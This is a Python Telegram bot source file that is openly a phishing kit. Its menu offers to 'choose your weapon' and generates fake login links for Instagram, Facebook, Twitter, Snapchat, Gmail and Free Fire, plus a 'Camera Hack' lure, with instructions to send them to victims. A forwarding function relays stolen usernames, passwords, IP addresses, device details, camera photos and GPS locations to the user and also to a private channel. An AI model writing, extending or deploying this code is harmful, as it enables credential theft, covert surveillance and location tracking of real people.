import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
import os
from config import *

bot = telebot.TeleBot(BOT_TOKEN)

# ========== LINK GENERATE ==========
def generate_phishing_link(user_id, target_type):
    if not BASE_URL:
        return "❌ BASE_URL not set. Please set it in Render environment variables."
    unique_id = str(uuid.uuid4())[:8]
    return f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📸 Camera Hack", callback_data="cam"),
        InlineKeyboardButton("📱 Social Media", callback_data="social"),
        InlineKeyboardButton("📧 Gmail", callback_data="gmail"),
        InlineKeyboardButton("🎮 Free Fire", callback_data="ff"),
        InlineKeyboardButton("🔗 All Links", callback_data="all")
    )
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Camera Hack\n"
        "📱 Social Media\n"
        "📧 Gmail\n"
        "🎮 Free Fire\n"
        "🔗 All Links",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ========== CALLBACK QUERY HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    data = call.data

    if data == "cam":
        msg = bot.send_message(
            user_id,
            "📤 Send me a photo (for victim)\n📤 Then send redirect link (URL)"
        )
        bot.register_next_step_handler(msg, get_photo_and_link, user_id)

    elif data == "social":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("Instagram", callback_data="ig"),
            InlineKeyboardButton("Facebook", callback_data="fb"),
            InlineKeyboardButton("Twitter", callback_data="tw"),
            InlineKeyboardButton("Snapchat", callback_data="sc"),
            InlineKeyboardButton("⬅ Back", callback_data="back")
        )
        bot.edit_message_text(
            "Choose platform:",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup
        )

    elif data in ["ig", "fb", "tw", "sc"]:
        link = generate_phishing_link(user_id, data)
        if "❌" in link:
            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="social")
        )
        bot.edit_message_text(
            f"✅ *{data.upper()} phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data == "gmail":
        link = generate_phishing_link(user_id, "gmail")
        if "❌" in link:
            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="back")
        )
        bot.send_message(
            user_id,
            f"✅ *GMAIL phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "✅ Gmail link generated!")

    elif data == "ff":
        link = generate_phishing_link(user_id, "ff")
        if "❌" in link:
            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="back")
        )
        bot.send_message(
            user_id,
            f"✅ *FREE FIRE phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "✅ Free Fire link generated!")

    elif data == "all":
        links = {}
        for t in ["cam", "ig", "fb", "tw", "sc", "gmail", "ff"]:
            links[t] = generate_phishing_link(user_id, t)
        text = "```\n" + "\n".join([f"{k.upper()}: {v}" for k, v in links.items()]) + "\n```"
        bot.send_message(user_id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅ All links generated!")

    elif data == "back":
        start(call.message)

    elif data.startswith("copy_"):
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard!")

# ========== PHOTO + REDIRECT (SIRF CAMERA KE LIYE) ==========
def get_photo_and_link(message, user_id):
    if message.photo:
        photo_id = message.photo[-1].file_id
        # Store photo ID in a global dict (temporary)
        if user_id not in bot.user_data:
            bot.user_data = {}
        bot.user_data[user_id] = {"photo": photo_id}
        bot.send_message(user_id, "Now send redirect link (URL)")
        bot.register_next_step_handler(message, get_redirect_link, user_id)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.")
        start(message)

def get_redirect_link(message, user_id):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        if user_id not in bot.user_data:
            bot.user_data = {}
        bot.user_data[user_id]["redirect"] = redirect_url
        link = generate_phishing_link(user_id, "cam")
        if "❌" in link:
            bot.send_message(user_id, "❌ BASE_URL missing! Set it in Render env.")
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ Camera phishing link ready:\n\n`{link}`\n\nVictim will see your photo and redirect.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://")
        get_redirect_link(message, user_id)

# ========== FORWARD DATA TO USER + CHANNEL ==========
def forward_to_user_and_channel(user_id, data):
    try:
        # Message for user
        user_text = f"📥 *Victim Data Received*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            user_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        creds = data.get('creds')
        if creds:
            user_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"

        # Send to user
        bot.send_message(user_id, user_text, parse_mode="Markdown")

        # Send photo to user
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('temp.jpg')
            except:
                pass

        # Send location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])

        # ===== NOW FORWARD TO PRIVATE CHANNEL =====
        channel_text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        if device:
            channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            channel_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        if creds:
            channel_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"

        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")

        # Send photo to channel
        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp2.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp2.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp2.jpg')
            except:
                pass

        # Send location to channel
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])

    except Exception as e:
        print(f"Forward error: {e}")

# ========== RUN ==========
if __name__ == "__main__":
    print("🤖 Bot is running...")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
